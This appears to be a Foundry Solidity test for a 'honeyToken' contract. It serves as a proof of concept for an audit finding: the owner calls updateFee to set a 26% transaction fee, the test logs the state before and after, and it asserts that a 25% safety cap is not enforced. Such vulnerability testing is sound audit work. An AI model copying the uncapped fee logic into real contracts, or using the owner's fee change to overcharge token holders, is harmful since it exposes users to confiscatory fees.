// SPDX-License-Identifier: MIT
pragma solidity 0.8.2;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/honeyToken.sol";

contract HoneyTokenTest is Test {
    honeyToken token;
    address owner = address(0x1);
    address feeAddress = address(0x2);
    
    function setUp() public {
        vm.prank(owner);
        token = new honeyToken(
            "Honey Token", 
            "HNY", 
            18, 
            1000000,   // Initial supply
            100,       // Initial txFee (1%)
            100,       // Initial burnFee (1%)
            100,       // Initial charityFee (1%)
            feeAddress,
            owner
        );
    }

    function testFeeCanExceedSafetyLimit() public {
        uint256 UNSAFE_TX_FEE = 2600; // 26% fee
        
        // Pre-trigger state
        console.log("--- BEFORE FEE UPDATE ---");
        console.log("Tax Fee Before:    ", token._TAX_FEE());
        console.log("Burn Fee Before:   ", token._BURN_FEE());
        console.log("Charity Fee Before:", token._CHARITY_FEE());
        
        // Trigger exploit
        console.log("--- TRIGGER: UPDATE FEE TO 26% ---");
        vm.startPrank(owner);
        token.updateFee(UNSAFE_TX_FEE, token._BURN_FEE(), token._CHARITY_FEE());
        vm.stopPrank();
        
        // Post-trigger state
        console.log("--- AFTER FEE UPDATE ---");
        console.log("Tax Fee After:    ", token._TAX_FEE());
        console.log("Burn Fee After:   ", token._BURN_FEE());
        console.log("Charity Fee After:", token._CHARITY_FEE());
        
        // Check vulnerability status
        console.log("--- VULNERABILITY VERIFICATION ---");
        bool taxFeeChanged = token._TAX_FEE() != 100;
        bool taxFeeExceeded = token._TAX_FEE() > 2500;
        
        if (taxFeeChanged && taxFeeExceeded) {
            console.log("Vulnerability Exists: Fee successfully set above 25% safety threshold");
        } else {
            console.log("Vulnerability not Exist: Fee remains within safety limits");
        }
        
        assertTrue(token._TAX_FEE() > 2500, "Fee not above 25% safety threshold");
    }
}